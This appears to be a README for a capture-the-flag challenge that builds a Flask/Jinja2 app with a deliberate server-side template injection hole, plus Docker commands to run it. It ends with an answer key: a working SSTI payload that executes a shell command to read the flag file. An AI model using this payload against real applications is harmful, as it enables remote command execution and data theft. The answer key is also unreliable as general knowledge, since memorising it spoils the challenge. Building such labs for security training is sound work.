# SSTI CTF Challenge Generator

Simple Server-Side Template Injection (SSTI) challenge generator using Flask and Jinja2. Creates a vulnerable endpoint where players need to exploit template injection to read a flag.

## Required Environment Variables

- `FLAG` - The flag that will be placed in the container (e.g., "CTF{y0ur_fl4g_h3r3}")

## Quick Start

Build and run:
```powershell
docker build -t ctf-proto .
docker run -e FLAG="CTF{test_flag}" -p 5000:5000 ctf-proto
```

## Answer Key
{{config.__class__.__init__.__globals__['os'].popen('cat /flag/flag.txt').read()}}
